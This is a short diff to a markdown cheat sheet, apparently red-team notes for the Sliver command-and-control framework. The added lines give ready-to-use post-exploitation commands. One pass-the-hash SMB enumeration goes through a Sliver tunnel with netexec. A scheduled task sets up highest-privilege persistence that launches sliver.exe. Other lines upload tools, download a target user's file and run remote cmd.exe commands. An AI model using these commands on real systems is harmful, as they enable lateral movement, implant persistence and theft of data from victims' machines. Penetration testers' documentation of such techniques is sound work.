@@ -659,6 +659,29 @@ portfwd add -b 0.0.0.0:4445 -r 172.16.1.10:445
 
 **Important:** When using netexec or other multi-threaded tools through sliver tunnels, use `-t 1` to limit threads and avoid killing the tunnel:
 
+```bash
+netexec smb 127.0.0.1 -u <user> -d <DOMAIN> -H <hash> --shares --port 4445 -t 1
+```
+
+### Scheduled Task Persistence
+
+```
+schtasks /create /tn "OneShotTask" /tr "C:\path\to\sliver.exe" /sc ONCE /st 23:59 /rl HIGHEST /f
+```
+
+### Upload and Download
+
+```
+upload /opt/bin/tool.exe
+download C:\Users\target\file.txt
+```
+
+### Execute Commands
+
+```
+execute -o cmd.exe /c '<command>'
+```
+
 ### Credential Hunting from Sliver
 
 Search for passwords in files across the file system:
